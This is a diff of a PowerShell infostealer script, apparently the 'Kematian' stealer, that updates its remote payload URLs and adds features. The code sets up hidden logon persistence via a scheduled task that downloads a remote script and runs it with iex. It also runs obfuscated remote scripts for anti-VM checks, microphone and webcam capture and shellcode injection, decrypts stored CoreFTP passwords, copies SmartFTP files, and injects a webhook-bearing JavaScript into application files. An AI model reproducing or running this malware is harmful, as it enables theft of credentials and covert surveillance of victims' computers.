@@ -85,10 +85,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -96,14 +96,14 @@ function Invoke-TASKS {
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
+        $link = "https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/blockhosts.ps1"
         iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
 }
 
 function VMPROTECT {
-    $link = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+    $link = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
     Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
@@ -819,36 +819,42 @@ function Backup-Data {
         $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)
         return $decryptedString
     }
+
     function Get-RegistryValues {
         $regPath = 'HKCU:\Software\FTPware\CoreFTP\Sites'
-        $profiles = Get-ChildItem -Path $regPath
-        $output = "[CoreFTP]`n`n"  
-        foreach ($profile in $profiles) {
-            $profileKey = Get-Item -LiteralPath $profile.PSPath
-            $profileValues = Get-ItemProperty -Path $profile.PSPath
-            $values = @{
-                Host = $profileValues.Host
-                Port = $profileValues.Port
-                User = $profileValues.User
-                Password = "N/A" 
-            }
-            if ($profileValues.PW) {
-                try {
-                    $values.Password = Decrypt-String -hexString $profileValues.PW
-                } catch {
-                    Write-Host "[!] ERROR: Failed to decrypt password: $_"
+        if (Test-Path $regPath) {
+            $profiles = Get-ChildItem -Path $regPath -ErrorAction SilentlyContinue
+            $output = "[CoreFTP]`n`n"
+            foreach ($profile in $profiles) {
+                $profileKey = Get-Item -LiteralPath $profile.PSPath -ErrorAction SilentlyContinue
+                $profileValues = Get-ItemProperty -Path $profile.PSPath -ErrorAction SilentlyContinue
+                $values = @{
+                    Host = $profileValues.Host
+                    Port = $profileValues.Port
+                    User = $profileValues.User
+                    Password = "N/A"
+                }
+                if ($profileValues.PW) {
+                    try {
+                        $values.Password = Decrypt-String -hexString $profileValues.PW
+                    } catch {
+                        Write-Host "[!] ERROR: Failed to decrypt password: $_"
+                    }
+                }
+                if ($values) {
+                    $output += "Host: $($values.Host)`n"
+                    $output += "Port: $($values.Port)`n"
+                    $output += "Username: $($values.User)`n"
+                    $output += "Password: $($values.Password)`n"
+                    $output += "`n"
                 }
             }
-            if ($values) {
-                $output += "Host: $($values.Host)`n"
-                $output += "Port: $($values.Port)`n"
-                $output += "Username: $($values.User)`n"
-                $output += "Password: $($values.Password)`n"
-                $output += "`n"
-            }
+            return $output
+        } else {
+            return $null
         }
-        return $output
     }
+
     try {
         $results = Get-RegistryValues
         if ($results) {
@@ -856,25 +862,27 @@ function Backup-Data {
             Write-Host "[!] CoreFTP passwords saved to $coreftp" -ForegroundColor Green
         } else {
             Write-Host "[!] No CoreFTP profiles found." -ForegroundColor Red
-            }
-           } catch {
+        }
+         } catch {
         Write-Host "[!] INFO: CoreFTP not installed or failed to retrieve registry values" -ForegroundColor Red
         }
-     }
+    }
     CoreFTP_backup
 	
     # smartftp
     function smartftp_backup {
-        $sourceDir = "$env:appdata\SmartFTP\Client 2.0\"
-        $SmartFTP_dir = "$ftp_clients\SmartFTP"
-    	New-Item -ItemType Directory -Force -Path $SmartFTP_dir | Out-Null
-        Get-ChildItem -Path $sourceDir -Include @("*.dat","*.xml") -Recurse | ForEach-Object {
-            $destinationPath = Join-Path -Path $SmartFTP_dir -ChildPath $_.Name
-            Copy-Item -Path $_.FullName -Destination $destinationPath -Force -EA Ignore
-        }
+    $sourceDir = "$env:appdata\SmartFTP\Client 2.0\"
+    $SmartFTP_dir = "$ftp_clients\SmartFTP"
+	New-Item -ItemType Directory -Force -Path $SmartFTP_dir | Out-Null
+    if (Test-Path -Path $sourceDir) {
+        Get-ChildItem $sourceDir -Include @("*.dat","*.xml") -EA Ignore -Recurse | Copy-Item -Destination $SmartFTP_dir
         Write-Host "[!] SmartFTP files have been copied to $SmartFTP_dir" -ForegroundColor Green
+    } else {
+        Write-Host "[!] Source directory not found: $sourceDir" -ForegroundColor Red
+        }
     }
-    smartftp_backup 
+    smartftp_backup
+
 
     #------------------------#
     #  PASSWORD MANAGERS     #
@@ -1090,11 +1098,26 @@ function Backup-Data {
 
     Set-Location "$env:LOCALAPPDATA\Temp"
 
+    # webcam 
+    if ($webcam) {
+        Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
+        $webcam = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/webcam.ps1")
+        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
+        $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+        $invokewebcam.WaitForExit()
+        $webcam_image = "$env:temp\webcam.png"
+        if (Test-Path -Path $webcam_image) {
+            Move-Item -Path $webcam_image -Destination $folder_general
+            Write-Host "[!] The webcam image moved successfully to $folder_general" -ForegroundColor Green
+        } else {
+            Write-Host "[!] The webcam image does not exist." -ForegroundColor Red
+        }
+    }
 
     # record mic for 10 sec
     if ($record_mic) {
         Write-Host "[!] Recording PC MIC for 10 seconds" -ForegroundColor Green
-        $mic = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/mic.ps1")
+        $mic = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/mic.ps1")
         $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$mic')"
         $invokemic = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
         $invokemic.WaitForExit()
@@ -1133,7 +1156,7 @@ function Backup-Data {
                 foreach ($file in $files) {
                     if ($file.Name -eq "index.js") {
                         $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/injection.js")
                         if ($content -ne "") {
                             $data_webhook = $webhook -replace "/data", "/injection"
                             $replacedContent = $content -replace "%WEBHOOK%", $data_webhook
@@ -1148,7 +1171,7 @@ function Backup-Data {
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
     Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
-    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
